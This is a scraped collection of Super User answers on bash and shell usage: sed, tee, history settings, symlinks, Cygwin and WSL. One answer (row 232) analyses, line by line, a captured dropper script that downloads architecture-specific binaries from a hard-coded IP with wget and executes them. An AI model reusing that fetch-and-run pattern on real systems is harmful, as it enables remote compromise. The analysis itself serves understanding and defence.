230,https://superuser.com/questions1136409/,"['The . (""dot"") command is a synonym/shortcut for the shell\'s built-in source command. ', 'It causes the named shell script to be read in and executed within the current shell context (rather than a subshell). This allows the sourced script to modify the environment of the calling shell, such as setting variables and defining shell functions and aliases. ']","[<code>.</code>, <code>source</code>]"
231,https://superuser.com/questions241018/,"['To convert sequences of more than one space to a tab, but leave individual spaces alone:', 'To do this for a number of files:', 'or', 'or']","[<code>sed 's/ \+ /\t/g' inputfile &gt; outputfile
</code>, <code>for inputfile in *
do
    sed 's/ \+ /\t/g' ""$inputfile"" &gt; tmpfile &amp;&amp; mv tmpfile ""$inputfile""
done
</code>, <code>for inputfile in *
do
    sed -i.bak 's/ \+ /\t/g' ""$inputfile""
done
</code>, <code>find . -type f -exec sed -i.bak 's/ \+ /\t/g' {} \;
</code>]"
232,https://superuser.com/questions1356359/,"['Line by line:', 'Establishes the sh shell, whichever that is, as the shebang line. sh%20/tmp/ks in the request overrides this, so this line is treated as a normal comment and ignored.', ""Declares an arbitrary name, presumably to avoid colliding with other filenames. I'm not sure why they wouldn't just use mktemp, but maybe that is not available on all platforms."", 'Enumerates several common CPU architectures.', 'The server which has the exploit.', 'Tries to change directory to somewhere your web server is likely to be able to create files. I believe SELinux will help with this, by enforcing much stricter rules about what the web server can do than the file system does on its own.', 'For each CPU architecture…', 'Removes previously tried exploit programs. Unnecessary because of the next line, so can be ignored.', 'Copies the current shell executable (/bin/sh). Can be ignored because of the line after next.', 'Makes everyone have full access to the new file. This should have been after the wget command, which is either a sign of a shell scripting newbie or a misdirection technique.', 'Empties out the file. Pointless because of the next line.', 'Overwrites the file with the exploit script for this architecture. -O -> $u could have been written -O - > $u (the hyphen indicates that the download should be written to standard output) which is equivalent to -O $u.', 'Runs the exploit script with the architecture as the first argument.', 'Ends the loop.', 'It looks like this is a trivial exploit attempt script, trying known exploits against various CPU platforms. I do not know why it overwrites $u three times, but those operations could simply be remains from an earlier iteration of the script. Presumably that earlier version had the exploits hard coded rather than dynamically served - the former is easier but almost guarantees that the script will be less effective over time as bugs are patched.']","[<code>#!/bin/sh
</code>, <code>sh</code>, <code>sh%20/tmp/ks</code>, <code>u=""asgknskjdgn""
</code>, <code>mktemp</code>, <code>bin_names=""mmips mipsel arm arm7 powerpc x86_64 x86_32""
</code>, <code>http_server=""80.211.173.159""
http_port=80
</code>, <code>cd /tmp/||cd /var/
</code>, <code>for name in $bin_names
    do
</code>, <code>    rm -rf $u
</code>, <code>    cp $SHELL $u
</code>, <code>/bin/sh</code>, <code>    chmod 777 $u
</code>, <code>wget</code>, <code>    &gt;$u
</code>, <code>    wget http://$http_server:$http_port/$name -O -&gt; $u
</code>, <code>-O -&gt; $u</code>, <code>-O - &gt; $u</code>, <code>-O $u</code>, <code>    ./$u $name
</code>, <code>done
</code>, <code>$u</code>]"
233,https://superuser.com/questions194529/,"['You need to run the rebaseall command from the rebase package to fix the problem.', ""Rebasing is usually only required when installed packages are installed that modify libraries that are dynamically loaded. I'll admit a bad habit of always running rebaseall after installing or upgrading packages in a Cygwin install rather than waiting for that error you hit to show up."", 'As for why you got that error and how rebasing solves the problem, this post has this to say about it:', ""You have it backwards.  Forking doesn't break the relocation.  Relocation\n  breaks forking.  cygwin1.dll needs to have a very special memory layout to\n  implement the fork semantics in Win32.  If this memory layout is disrupted,\n  fork breaks.  Relocating cygwin1.dll disrupts the required memory layout.\n  'rebaseall' does its best to locate all Cygwin DLLs that it knows of\n  into a layout that avoids collisions.  This maintains the required\n  memory layout so fork can do its job.""]","[<code>rebaseall</code>, <code>rebase</code>, <code>rebase</code>, <code>setup.exe</code>, <code>cygwin1.dll</code>, <code>rebaseall</code>, <code>rebaseall</code>]"
234,https://superuser.com/questions7448/,"['It sounds like the tee command will do what you want.', 'The key is to use', 'for process substitution.  With tee, use the following pattern:', 'So if you wanted to use the output of ls as input to two different grep programs, save the output of each grep to different files, and pipe all of the results through less, try:', 'The results of the ls -A will be ""piped"" into both greps.  The file hidden-files will have the contents from the output of the first grep, and normal-files will have the results of the second grep.  All of the files will be shown in the pager less. EDIT: what you see in less is the same exact output of ls -A, not the result of the greps. If you want to modify the output from ls -A to less, (e.g. swapping the order so normal files are listed before hidden ones) then try this:', 'Without >/dev/null, the output of greps would be appended to the output of ls -A instead of replacing it.', 'source']","[<code>tee</code>, <code>&gt;( )
</code>, <code>tee</code>, <code>tee &gt;(proc1) &gt;(proc2) &gt;(proc3) | proc4
</code>, <code>ls</code>, <code>grep</code>, <code>grep</code>, <code>less</code>, <code>ls -A | tee &gt;(grep ^[.] &gt; hidden-files) &gt;(grep -v ^[.] &gt; normal-files) | less
</code>, <code>ls -A</code>, <code>grep</code>, <code>hidden-files</code>, <code>grep</code>, <code>normal-files</code>, <code>grep</code>, <code>less</code>, <code>less</code>, <code>ls -A</code>, <code>grep</code>, <code>ls -A</code>, <code>less</code>, <code>ls -A | tee &gt;(grep ^[.]) &gt;(grep -v ^[.]) &gt;/dev/null | less
</code>, <code>&gt;/dev/null</code>, <code>grep</code>, <code>ls -A</code>]"
235,https://superuser.com/questions455212/,"['The computer where less scrolled had LESS=-r,\nthe other had LESS=-asXFMMRqix8.', 'From the less man page:', '-q or --quiet or --silent\n                Causes  moderately  ""quiet""  operation: the terminal bell is not\n                rung if an attempt is made to scroll past the end of the file or\n                before the beginning of the file.\xa0 If the terminal has a ""visual\n                bell"", it is used instead.\xa0 The bell will  be  rung  on  certain\n                other  errors, such as typing an invalid character.\xa0 The default\n                is to ring the terminal bell in all such cases.', '-X or --no-init\n                Disables sending the termcap initialization and deinitialization\n                strings  to  the  terminal.\xa0  This is sometimes desirable if the\n                deinitialization string does something unnecessary,\n  like  clearing the screen.', 'The -X option prevented scrolling all together and the -q option caused the pager to enter a non-scrollable state when scrolling past the beginning or end of file.', 'My options are now LESS=-asrRix8.']","[<code>less</code>, <code>LESS=-r</code>, <code>LESS=-asXFMMRqix8</code>, <code>less</code>, <code>-q</code>, <code>--quiet</code>, <code>--silent</code>, <code>-X</code>, <code>--no-init</code>, <code>-X</code>, <code>-q</code>, <code>LESS=-asrRix8</code>]"
236,https://superuser.com/questions940529/,"['The answer depends on how you start Cygwin.', 'If you start Cygwin with Cygwin.bat, modify the last line of /Cygwin.bat (usually C:\\cygwin\\ or C:\\cygwin64\\).', 'If you start Cygwin with mintty, then add the shell as a parameter:  mintty /usr/bin/zsh -']","[<code>/Cygwin.bat</code>, <code>C:\cygwin\</code>, <code>C:\cygwin64\</code>, <code>mintty /usr/bin/zsh -</code>]"
237,https://superuser.com/questions367275/,"[""You must wrap all escape sequences between \\[ and \\] in order for 'readline' to correctly calculate the prompt's visible length. Without them, 'readline' thinks the prompt is longer than it is, and doesn't know when the text reaches the margin.""]","[<code>\[</code>, <code>\]</code>]"
238,https://superuser.com/questions213724/,"['bg', 'See also ""JOB CONTROL"" in bash\'s manual page.']","[<code>bg</code>, <code>bash</code>]"
239,https://superuser.com/questions211966/,"[""Which history? bash-history? If you're losing bash history and you have multiple sessions at a time, it's because each session is overwriting the other sessions' history. "", 'You probably want to tell bash to not overwrite the history each time, but rather to append to it. You can do this by modifying your .bashrc to run shopt -s histappend. ', ""You can also increase the size of your history file by exporting HISTSIZE to be a large-ish number (it's in bytes, so 100000 should be plenty).""]",[<code>shopt -s histappend</code>]
240,https://superuser.com/questions210846/,"['In !*, ! is the history expansion prefix, and * is the word designator that means all arguments. You can memorize the general syntax as bang-line-colon-column (!line:column). There are many possible shortcuts: the default line is the previous line, the default column specifier is “all”, and you can leave off the colon if the column specifier is non-numeric (but !3 would mean line 3). You can use !:0 to refer to the command name, !:1, !:2, etc, to refer to successive arguments, !:$ for the last word, !:* for all arguments, and more.', 'See also this post by Michael Mrozek at Unix Stack Exchange.']","[<code>!*</code>, <code>!</code>, <code>*</code>, <code>!</code>, <code>:</code>, <code>!3</code>, <code>!:0</code>, <code>!:1</code>, <code>!:2</code>, <code>!:$</code>, <code>!:*</code>]"
241,https://superuser.com/questions184047/,"[""Considering how linux jobs and process ownership works, I'm afraid it's not really possible to re-own a process, without help from the adopting process."", ""A parent may 'disown' a child, which is then 'adopted' by the process named 'init'.  System security prevents someone from grabbing someone else's processes.  When you disown it, a process becomes someone else's (init's) to control.  You as the 'user' could still kill the process, but you can't get it back.  Attempting to coerce init to return your process is unlikely to work, as init doesn't even read mail."", 'As mean as it sounds, it really boils down to the answer of ""Don\'t do that!"".']",[]
242,https://superuser.com/questions59175/,"['To get the ‘cycle through possible completions’ behavior, copy the following into an appropriate place in your .bashrc file:', ""Also, bash-completion provides many extra kinds of completion besides just pathname completion. For example, menu-complete works fine with Git's bash-completion module to complete command names, option names, etc.""]","[<code>[[ $- = *i* ]] &amp;&amp; bind TAB:menu-complete
</code>]"
243,https://superuser.com/questions179368/,['Bash is bash so the shell and its built-ins are the same. But be aware that the behavior of some tools like ps or head can differ in the details thus your scripts might fail.'],"[<code>ps</code>, <code>head</code>]"
244,https://superuser.com/questions387007/,"['Use bash -v.', 'This is the script:', 'This is the output:', 'Unfortunately, there is no special marker like PS4 for printing expanded commands. You could combine both though to quickly identify commands:']","[<code>bash -v</code>, <code>#!/bin/bash -v

echo ""Hello, World"" | sed 's|Hello|Goodbye|'

echo ""Done.""
</code>, <code>#!/bin/bash -v

echo ""Hello, World"" | sed 's|Hello|Goodbye|'
Goodbye, World

echo ""Done.""
Done.
</code>, <code>PS4</code>, <code>#!/bin/bash -vx

echo ""Hello, World"" | sed 's|Hello|Goodbye|'
+ echo 'Hello, World'
+ sed 's|Hello|Goodbye|'
Goodbye, World

echo ""Done.""
+ echo Done.
Done.
</code>]"
245,https://superuser.com/questions232885/,"['I ignore ls without commands, bg, fg, exit, pwd, clear, mount and umount:', 'If you include this in your HISTIGNORE string you can suppress anything as you wish by adding a space at the front of the command:', 'This is my HISTIGNORE:', ""I've excluded some other stuff that I have in there that are repetitive commands that are unique to my server. Anything you do that is simple is a good thing to exclude."", ""I have other stuff which I have forgotten to add but I'm miles away from my Linux box so I am going off of memory. ""]","[<code>ls</code>, <code>bg</code>, <code>fg</code>, <code>exit</code>, <code>pwd</code>, <code>clear</code>, <code>mount</code>, <code>umount</code>, <code>HISTIGNORE</code>, <code>""[ \t]*"" 
</code>, <code>HISTIGNORE</code>, <code>HISTIGNORE=""&amp;:ls:[bf]g:exit:pwd:clear:mount:umount:[ \t]*""
</code>]"
246,https://superuser.com/questions265220/,"['The reason is because in bash, * does not include files starting with dot (.).', 'You can run', 'It will warn you that it did not copy . or .., or any subdirectories, but this is fine.', 'Or, if you want to copy dot files and normal files together, run', 'You could also run', 'which will work in bash, but not sh.', ""And if you don't mind subdirectories being copied too, then this is the easiest:"", ""Tip: If ever wildcards aren't doing what you expect, try running it with echo, e.g.""]","[<code>bash</code>, <code>*</code>, <code>.</code>, <code>cp A/.* B
</code>, <code>.</code>, <code>..</code>, <code>cp A/.* A/* B
</code>, <code>shopt -s dotglob
cp A/* B
</code>, <code>bash</code>, <code>sh</code>, <code>cp -R A/ B
</code>, <code>$ echo A/*
A/file1 A/file2

$ echo A/.*
A/. A/.. A/.hidden1 A/.hidden2

$ echo A/.* A/*
A/. A/.. A/.hidden1 A/.hidden2 A/file1 A/file2

$ shopt -s dotglob
$ echo A/*
A/file1 A/file2 A/.hidden1 A/.hidden2
</code>]"
247,https://superuser.com/questions640839/,"['I finally found a way to automatically log in using elinks. It works and it is even easy to configure!', 'Two options need to be set. This can done by adding the following lines in ~/.elinks/elinks.conf (if the file is not there, create one) or by changing the values at the respective positions in the options dialog within elinks:', 'Steps for a scriptable autologin are then:', 'The latter command should perform the automatic login without further user interaction.', 'I actually use timeout 1m elinks -auto-submit http://somesite.com &, so that I do not have an idling elinks process running in the background all the time.']","[<code>elinks</code>, <code>~/.elinks/elinks.conf</code>, <code>elinks</code>, <code>    # Save username and password for later use
set document.browse.forms.show_formhist = 1
    # Do not ask for confirmation before a form is submitted
set document.browse.forms.confirm_submit = 0
</code>, <code>elinks</code>, <code>elinks -auto-submit http://somesite.com</code>, <code>timeout 1m elinks -auto-submit http://somesite.com &amp;</code>]"
248,https://superuser.com/questions259601/,"[""Not by default (There might be some exceptions to this), there isn't. But if you use the alias command you can create a shortcut like this:"", 'This will allow you to use the command .. to do cd ...']","[<code>alias</code>, <code>alias ..=""cd ..""
</code>, <code>..</code>, <code>cd ..</code>]"
249,https://superuser.com/questions1089955/,"['You can disable the auto command completion by navigating to the following menu:', 'View > Auto command completion']","[<code>View</code>, <code>&gt;</code>, <code>Auto command completion</code>]"
250,https://superuser.com/questions79717/,"['Grep for a hard limit setting in your bash initialization files.  From the bash man page.', 'A hard limit cannot be increased once it is set; a soft limit may  be  increased  up  to  the value of the hard limit.', 'The hard limit is set via the ulimit -H flag.  It may be set in /etc/bash* or /etc/profile* files.  Look for a ulimit -Hc setting.']",[]
251,https://superuser.com/questions291224/,"['No. CtrlD on *nix generates a EOF, which various shells interpret as running exit. The equivalent for EOF on Windows is CtrlZ, but cmd.exe does not interpret this specially when typed at the prompt.']",[<code>exit</code>]
252,https://superuser.com/questions344533/,"[""It's an executable file that misses required libraries. Use ldd to see what it needs, then provide these files.""]",[<code>ldd</code>]
253,https://superuser.com/questions864478/,"['A DEBUG trap could be written to cancel commands that look suspicious. The following, or code similar to it, can be added to your ~/.bashrc:', 'Adjust the logic to taste.', ""(I don't actually expect this approach to be useful -- too many ways to mess up a command destructively to find them testing one-by-one -- but it provides a literal answer to the question).""]","[<code>DEBUG</code>, <code>~/.bashrc</code>, <code>shopt -s extdebug
checkcommand() {
  if [[ $BASH_COMMAND = 'rm -r'*' *' ]]; then
    echo ""Suppressing rm -r command ending in a wildcard"" &gt;&amp;2
    return 1
  fi
  # check for other commands here, if you like
  return 0
}
trap checkcommand DEBUG
</code>]"
254,https://superuser.com/questions104981/,"['You can get and use the xclip and xsel commands. Instructions for obtaining and using them are here.', 'Without any arguments, xclip copies into the primary (middle-click-paste) clipboard instead of the Ctrl-C/Ctrl-V/right-click-context-menu clipboard.', 'Try echo foo | xclip -selection clipboard to copy some text into the latter.', 'To output the clipboard to standard out: xclip -selection clipboard -o', 'The equivalent utility for MacOS is pbcopy (and pbpaste)']","[<code>xclip</code>, <code>xsel</code>, <code>xclip</code>, <code>echo foo | xclip -selection clipboard</code>, <code>xclip -selection clipboard -o</code>, <code>pbcopy</code>, <code>pbpaste</code>]"
255,https://superuser.com/questions342982/,"['The here string redirection (<<<) is a simple form of here document redirection (<<). Here string redirection is not ""binary safe""; Bash will perform expansion on the here string.  In addition, Bash will append a new-line to the end of the here string (issue the command xxd -p <<< ""foo"" and you\'ll get 666f6f0a in return).', 'Your only safe bet, excluding pipes, is I/O redirection.', 'Similar not binary safe question here. You can store encoded data and try this', 'however this is not far from ', 'but without pipe metachar.']","[<code>&lt;&lt;&lt;</code>, <code>&lt;&lt;</code>, <code>xxd -p &lt;&lt;&lt; ""foo""</code>, <code>666f6f0a</code>, <code>COMMAND_WITH_BIN_INPUT &lt;(uudecode &lt;(echo ""$uuEncodedData"")) 
</code>, <code>echo ""$uuEncodedData""|uudecode|COMMAND_WITH_BIN_INPUT
</code>]"
256,https://superuser.com/questions299694/,"['Have a look at autojump:', 'One of the most used shell commands is “cd”. A quick survey among my friends revealed that between 10 and 20% of all commands they type are actually cd commands! Unfortunately, jumping from one part of your system to another with cd requires you to enter almost the full path, which isn’t very practical and requires a lot of keystrokes.', 'autojump is a faster way to navigate your filesystem. It works by maintaining a database of the directories you use the most from the command line. The jumpstat command shows you the current contents of the database. You need to work a little bit before the database becomes usable. Once your database is reasonably complete, you can “jump” to a commonly ""cd""ed directory by typing:\nj dirspec']",[<code>j dirspec</code>]
257,https://superuser.com/questions1530389/,"[""It's a Here Document -- the lines between <<!END and !END are fed to the stdin of wlst.sh "", 'It could also be expressed as:', 'but without the potential effects of running the command in a subshell.', 'It could also also be expressed as:']","[<code>&lt;&lt;!END</code>, <code>!END</code>, <code>echo ""connect('user','pw');
p=redeploy('application');
p.printStatus();
exit();"" | /u01/app/oracle/middleware/oracle_common/common/bin/wlst.sh
</code>, <code>echo ""connect('user','pw');
p=redeploy('application');
p.printStatus();
exit();"" &gt; someFile
/u01/app/oracle/middleware/oracle_common/common/bin/wlst.sh &lt; someFile
rm someFile
</code>]"
258,https://superuser.com/questions702402/,"[""Your script is most likely removing the directory, and not just the files which are there.  So, when you have cd'd into it, and the directory is removed, you do ls on a directory which does not actually exist."", 'By cd .. and cd (directory) you move up and back into the (newly created) directory, and the files are there as you expect.', 'The best alternative is instead of cding in and out of the directory, is to add the directory name to your ls command, and run it from the parent directory.  So, ls YourSubdirectory instead of just ls.']","[<code>cd</code>, <code>ls</code>, <code>cd ..</code>, <code>cd (directory)</code>, <code>cd</code>, <code>ls</code>, <code>ls YourSubdirectory</code>, <code>ls</code>]"
259,https://superuser.com/questions322216/,"['I do not know if it is ffmpeg that cannot output its data to stdout, or ffplay that cannot take its input from stdin.', 'If it is ffmpeg that cannot output its data to stdout:', '(You migth need to add a - argument to ffplay so it takes its input from stdin.)', 'If it is ffplay that cannot take its input from stdin:', 'For more informations about the <(command) and >(command) construct, see the Process Substitution section of the bash manual.']","[<code>ffmpeg</code>, <code>ffplay</code>, <code>ffmpeg</code>, <code>capture /dev/stdout | ffmpeg -i - &gt;(ffplay 2&gt; /dev/null)
</code>, <code>-</code>, <code>ffplay</code>, <code>ffplay</code>, <code>ffplay &lt;(capture /dev/stdout | ffmpeg -i -) 2&gt; /dev/null
</code>, <code>&lt;(command)</code>, <code>&gt;(command)</code>]"
260,https://superuser.com/questions697667/,"[""The -d ' ' tells cut to split on spaces. -f 3 selects the third column."", 'You can also use awk, which does the splitting based on space already and makes the columns available as $1, $2, … ']","[<code>$ echo ""Watermelons and cucumbers"" | cut -d ' ' -f 3
cucumbers
</code>, <code>-d ' '</code>, <code>cut</code>, <code>-f 3</code>, <code>awk</code>, <code>$1</code>, <code>$2</code>, <code>$ echo ""Watermelons and cucumbers"" | awk '{ print $3 }'
cucumbers
</code>]"
261,https://superuser.com/questions195781/,"[""The -n option is available in newer versions of sudo, but as you stated that's not an option.  There's no real way to do what you're looking for short of just trying sudo and seeing if it comes back with a prompt for a password.  If your concern is you want a visual indication, why not start do sudo /bin/bash to start a root bash session?  Note that this is insecure, but it's also somewhat insecure if someone realizes your prompt changes on sudo.  ""]",[<code>-n</code>]
262,https://superuser.com/questions612435/,"[""You should find dos2unix in the category Utils, Base, or Text. It's easiest to use the search function.\nIf the package is not listed at all, try to use a different mirror."", 'If you installed this package while your cygwin terminal is still open, do a rehash (depends on you shell) or simply start a new terminal.', '']","[<code>dos2unix</code>, <code>rehash</code>]"
263,https://superuser.com/questions1075659/,"['I got it working by installing x11-apps to get the X subsystem, then running a X listener like XMING or XManager on the Windows10 side.  Set the display in bash with the following:', 'export DISPLAY=:0', ""(You also can add export DISPLAY=:0 to the last line of your user's .bashrc file)"", 'Then run xclock to verify.']",[]
264,https://superuser.com/questions161178/,"['If the previous key pressed was ESC, this is because there are keys that can generate escape sequences beginning with ESC O.  For example depending on the cursor key mode, the up arrow key may generate the escape sequence ESC O A.', 'If it sees a partial escape sequence, vim will wait for a short timeout to see if another character is received that matches one of the escape sequences defined for your terminal type.  If not it will treat the characters as separate keystrokes.  You can test this by entering a capital A while waiting for the line to open to see if it treats it as an up arrow instead.', 'There are some vim settings that can be used to control this.  :set ttimeoutlen=100 will change the escape sequence timeout to 100ms.  :set noesckeys will completely disable recognition of keys sending an escape sequence when in insert mode.  Also, vi-compatible mode will not have this issue because esckeys is off in that mode – that is why vim -u NONE works.']","[<code>:set ttimeoutlen=100</code>, <code>:set noesckeys</code>, <code>vim -u NONE</code>]"
265,https://superuser.com/questions1108480/,"['1. Go into the Control Panel and click Turn Windows features on or off\n', '2. Then select the package Windows Subsystem for Linux (Beta). It will go through the installation process and ask you to restart your computer.\n', ""3. Once it's restarted, you can search for bash in the search bar.\n""]",[<code>Windows Subsystem for Linux</code>]
266,https://superuser.com/questions1148950/,"['As indicated by the text, you just have to reference (e.g. by $VARNAME or ${VARNAME}) the variables as in a usual shell command. However, you have to make sure that the shell does not expand them beforehand.', 'Here are some examples to illustrate this (assuming export FOO=BAR):', 'As you can see, $FOO2 has been replaced by """" as it was not defined. Now we can restrict that replacement to only $FOO by:', 'using """" instead of \'\' would lead to substitution before it is wanted:', '(This amounts to the effective call envsubst ""BAR"" which detects no variables so none are replaced.)', 'As the man-page said, all variables that are referenced in SHELL-FORMAT are replaced, so we can even do this:', 'As you can see, the SHELL-FORMAT is quite flexible.', 'Finally, the parameter --variables allows you to evaluate which variables are selected for substitution by the SHELL-FORMAT:', 'In the premature substitution example from above this would have shown the error:', 'As stated in the man-page, envsubst does not process any stdinput when --variables is present.']","[<code>$VARNAME</code>, <code>${VARNAME}</code>, <code>export FOO=BAR</code>, <code>$ echo '$FOO$FOO2' | envsubst
BAR
</code>, <code>$ echo '$FOO$FOO2' | envsubst '$FOO'
BAR$FOO2
</code>, <code>""""</code>, <code>''</code>, <code>echo '$FOO$FOO2' | envsubst ""$FOO""
$FOO$FOO2
</code>, <code>envsubst ""BAR""</code>, <code>man</code>, <code>SHELL-FORMAT</code>, <code>echo '$FOO$FOO2$FOO3' | envsubst '$FOO some more text ${FOO3}'
BAR$FOO2
</code>, <code>SHELL-FORMAT</code>, <code>--variables</code>, <code>SHELL-FORMAT</code>, <code>envsubst --variables '$FOO some more text ${FOO3}'
FOO
FOO3
</code>, <code>$ envsubst --variables ""$FOO""
(empty string returned)
</code>, <code>man</code>, <code>envsubst</code>, <code>--variables</code>]"
267,https://superuser.com/questions159106/,"[""There's a similar question on stackoverflow.com."", 'The best answer there is to use Ctrl+G to cancel the current search.']",[<code>Ctrl+G</code>]
268,https://superuser.com/questions440013/,[],"[<code>newContent=`cat new_file`
perl -0777 -i -pe ""s/(### BEGIN GENERATED CONTENT\\n).*(\\n### END GENERATED CONTENT)/\$1$newContent\$2/s"" existing_file
</code>]"
269,https://superuser.com/questions125728/,"['bash is a superset of sh ie. everything you can do in sh you can do in bash.', ""Bash has more features (branching, builtins, arrays) making script easier to write. Some later *nix'es have /bin/sh as a link to /bin/bash"", ""For a full explanation of what here's a tutorial""]","[<code>bash</code>, <code>sh</code>, <code>sh</code>, <code>bash</code>, <code>/bin/sh</code>, <code>/bin/bash</code>]"
270,https://superuser.com/questions187455/,"['What you want can fairly easily be done by displaying the first line before displaying the prompt. For example, the following displays a prompt of \\w on the left of the first line and a prompt of \\u@\\h on the right of the first line. It makes use of the $COLUMNS variable which contains the width of the terminal and the $PROMPT_COMMAND parameter which is evaluated before bash displays the prompt.']","[<code>\w</code>, <code>\u@\h</code>, <code>$COLUMNS</code>, <code>$PROMPT_COMMAND</code>, <code>print_pre_prompt () 
{ 
    PS1L=$PWD
    if [[ $PS1L/ = ""$HOME""/* ]]; then PS1L=\~${PS1L#$HOME}; fi
    PS1R=$USER@$HOSTNAME
    printf ""%s%$(($COLUMNS-${#PS1L}))s"" ""$PS1L"" ""$PS1R""
}
PROMPT_COMMAND=print_pre_prompt
</code>]"
271,https://superuser.com/questions511900/,"['Symlinks tend to like full paths or relative to the link, otherwise they can often be looking for file-1.txt locally (oddly enough).', 'Navigate to proper and execute ls -l and you can see that the symlink is looking for actual/file-1.txt, when it should be ../actual/file-1.txt.', 'So you have two options:', 'Give the full path', 'Navigate to the folder you want the link to be in and link from there', 'Edit: A hint to save typing.', 'You could just do ln -s ~/actual/file-{1,2}.txt ~/proper', 'The items in the curly braces are substituted and placed after each other, creating the command', 'which links both files to the target directory. Saves some major typing as you get further on in the shell.']","[<code>file-1.txt</code>, <code>proper</code>, <code>ls -l</code>, <code>actual/file-1.txt</code>, <code>../actual/file-1.txt</code>, <code>ln -s ~/actual/file-1.txt ~/actual/file-2.txt ~/proper
</code>, <code>cd proper
ln -s ../actual/file-1.txt ../actual/file-2.txt ./
</code>, <code>ln -s ~/actual/file-{1,2}.txt ~/proper</code>, <code>ln -s ~/actual/file-1.txt ~/actual/file-2.txt ~/proper
</code>]"
272,https://superuser.com/questions1317883/,"['In order to disable WSL, one has to go back into', 'Control Panel -> programs-features -> turn on/off Windows features and deselect Windows Subsystem for Linux, and Save.']",[]
273,https://superuser.com/questions600253/,"['You are confusing two very different kinds of input: STDIN and arguments. Arguments are a list of strings provided to the command as it starts, usually by specifying them after the command name (e.g. echo these are some arguments or rm file1 file2). STDIN, on the other hand, is a stream of bytes (sometimes text, sometimes not) that the command can (optionally) read after it starts. Here are some examples (note that cat can take either arguments or STDIN, but it does different things with them):', 'xargs can be thought of as converting STDIN-style input to arguments:', ""echo actually does more-or-less the opposite: it converts its arguments to STDOUT (which can be piped to some other command's STDIN):""]","[<code>echo these are some arguments</code>, <code>rm file1 file2</code>, <code>cat</code>, <code>echo file1 file2 | cat    # Prints ""file1 file2"", since that's the stream of
                          # bytes that echo passed to cat's STDIN
cat file1 file2    # Prints the CONTENTS of file1 and file2
echo file1 file2 | rm    # Prints an error message, since rm expects arguments
                         # and doesn't read from STDIN
</code>, <code>xargs</code>, <code>echo file1 file2 | cat    # Prints ""file1 file2""
echo file1 file2 | xargs cat    # Prints the CONTENTS of file1 and file2
</code>, <code>echo</code>, <code>echo file1 file2 | echo    # Prints a blank line, since echo doesn't read from STDIN
echo file1 file2 | xargs echo    # Prints ""file1 file2"" -- the first echo turns
                                 # them from arguments into STDOUT, xargs turns
                                 # them back into arguments, and the second echo
                                 # turns them back into STDOUT
echo file1 file2 | xargs echo | xargs echo | xargs echo | xargs echo    # Similar,
                                 # except that it converts back and forth between
                                 # args and STDOUT several times before finally
                                 # printing ""file1 file2"" to STDOUT.
</code>]"
274,https://superuser.com/questions560597/,"['This command should work:', 'How it works:', 'find -type l finds all links in the current directory.', ""-exec bash -c '...' {} \\; invokes bash to execute ...."", ""It passes {} – the name of the link that's currently being processed &dash as an argument, which bash can access as $0."", 'readlink -m ""$0"" returns the absolute path of the symbolic link\'s destination. ', 'ln -f ""$(readlink -m ""$0"")"" ""$0"" overwrites (-f) the symbolic link $0 with a hard link to its target.', 'If the link cannot be converted for some reason, it will remain untouched and ln will print an error message.']","[<code>find -type l -exec bash -c 'ln -f ""$(readlink -m ""$0"")"" ""$0""' {} \;
</code>, <code>find -type l</code>, <code>-exec bash -c '...' {} \;</code>, <code>...</code>, <code>{}</code>, <code>$0</code>, <code>readlink -m ""$0""</code>, <code>ln -f ""$(readlink -m ""$0"")"" ""$0""</code>, <code>-f</code>, <code>$0</code>]"
275,https://superuser.com/questions302230/,"['You want the readline setting:', ""You can either put it in ~/.inputrc (see note below), or put bind 'revert-all-at-newline on' in your ~/.bashrc."", 'Demo:', 'Further details are in the Bash manpage:', 'revert-all-at-newline', 'If set to ‘on’, Readline will undo all changes to history lines before returning when accept-line is executed. By default, history lines may be modified and retain individual undo lists across calls to readline. The default is ‘off’.', 'Note:', ""If a new ~/.inputrc file is created for the purpose of setting revert-all-at-newline, be aware that bash will use the readline settings in this file instead of any settings which may be in the file /etc/inputrc.  That is, any settings specified in /etc/inputrc will no longer be in effect.  Therefore, if the /etc/inputrc file exists, it's a good idea to start ~/.inputrc with the line:"", '$include /etc/inputrc']","[<code>set revert-all-at-newline on
</code>, <code>~/.inputrc</code>, <code>bind 'revert-all-at-newline on'</code>, <code>~/.bashrc</code>, <code>$ man bash
$ bind 'set revert-all-at-newline on'
$ man bsh # up arrow and edit
No manual entry for bsh
$ man bash # three up arrows
</code>, <code>revert-all-at-newline</code>, <code>on</code>, <code>off</code>, <code>~/.inputrc</code>, <code>revert-all-at-newline</code>, <code>/etc/inputrc</code>, <code>/etc/inputrc</code>, <code>/etc/inputrc</code>, <code>~/.inputrc</code>, <code>$include /etc/inputrc</code>]"
276,https://superuser.com/questions35256/,"['It’s easy:', 'See man python for a complete explanation from Apple.', 'Also, one gotcha: make sure you are running the Python that came with your computer and not some other one that you installed. Do this by typing which python at your command prompt. It should point to /usr/bin/python. I only mention this because my default is 2.6 under Snow Leopard (it was 2.5 when I was using Leopard). So the fact that you are getting 2.5 may indicate that there’s something else in your path.', 'Update', 'To address comments below:', 'This doesn’t do what people are asking.', 'It does for me, in OS X 10.8.2. After doing defaults write com.apple.versioner.python Version 2.6, the default version of Python is indeed 2.6. (And likewise after changing back to 2.7.)', 'This is true whether I run python directly, or use an executable script starting with #!/usr/bin/env python—I get the expected version of Python.', 'This does not solve the symlink in /System/Library/Frameworks/Python.framework/Versions where Current point to 2.7 which may cause problems (because it is still in the sys.path with 2.6 !) ', 'Indeed, it doesn’t fix that symlink.', 'However, run a short script that print()s the sys.path and (at least on my relatively default setup) the 2.6 library directories are on the path and the 2.7 dirs are not on the path. Nor is the Current symlinked directory on the path. So it should not be a problem for most scripts.', 'However, it’s possible—haven’t tested—that the Current symlink is used by either easy_install or pip. That would cause problems. It sure does seem like a bug that the symlink isn’t updated when you update the Python version.']","[<code>defaults write com.apple.versioner.python Version 2.6
</code>, <code>man python</code>, <code>which python</code>, <code>/usr/bin/python</code>, <code>defaults write com.apple.versioner.python Version 2.6</code>, <code>python</code>, <code>#!/usr/bin/env python</code>, <code>print()</code>, <code>sys.path</code>, <code>Current</code>, <code>Current</code>, <code>easy_install</code>, <code>pip</code>]"
277,https://superuser.com/questions192280/,"['Short answer: Yes it will.', 'From the bash man page:', 'After word splitting, unless the -f\n  option has been set (see The Set\n  Builtin), Bash scans each word for the\n  characters ‘*’, ‘?’, and ‘[’. If one\n  of these characters appears, then the\n  word is regarded as a pattern, and\n  replaced with an alphabetically sorted\n  list of file names matching the\n  pattern.']",[]
